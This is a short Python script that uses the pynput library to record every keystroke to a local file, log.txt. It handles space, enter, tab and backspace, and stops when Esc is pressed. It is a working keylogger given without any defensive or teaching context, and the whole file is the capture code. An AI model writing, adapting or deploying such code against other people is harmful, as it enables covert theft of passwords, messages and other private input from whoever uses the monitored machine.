import time
from pynput.keyboard import Listener

getTime = time.asctime()

with open("log.txt",'a') as f:

    f.write(f"\n\n{getTime}\n")


def writeToFile(key):

    letter = str(key).replace("'", "")

    if "Key.space" in letter:
        letter = ' '
        writeKey(letter)

    elif "enter" in letter:
        letter = "\n"
        writeKey(letter)

    elif "tab" in letter:
        letter = "\t"
        writeKey(letter)

    elif "Key" not in letter:
        writeKey(letter)

    elif letter == "Key.backspace":
        with open("log.txt", "r") as f:
            f_content = f.read()
            f_content = f_content[:-1]

        with open("log.txt", "w") as f:
            f.write(f_content)

    elif letter == "Key.esc":
        return False




def writeKey(letter):
    with open("log.txt", "a") as f:
        f.write(letter)


with Listener(on_press=writeToFile) as listen:
    listen.join()
